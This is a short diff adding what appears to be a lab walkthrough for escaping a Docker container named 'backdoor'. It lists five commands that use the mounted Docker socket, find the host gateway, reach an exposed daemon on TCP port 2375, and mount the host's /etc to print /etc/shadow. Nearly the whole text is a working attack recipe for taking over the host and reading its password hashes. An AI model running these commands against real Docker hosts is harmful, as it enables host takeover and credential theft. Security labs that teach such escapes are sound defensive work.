@@ -1,0 +1,19 @@
+1) Exec into the backdoor container
+
+docker-compose exec backdoor sh
+
+2) Access the daemon within the UNIX socket in / and list running containers
+
+docker -H unix:///docker.sock ps
+
+3) Obtain the IP address of the containers gateway (the host)
+
+route -n
+
+4) Access the daemon through the host on TCP 2375
+
+docker -H tcp://<host ip>:2375 ps
+
+5) Print /etc/shadow from the host
+
+docker -H unix:///docker.sock run --rm -v /etc:/host/ ubuntu cat /host/shadow
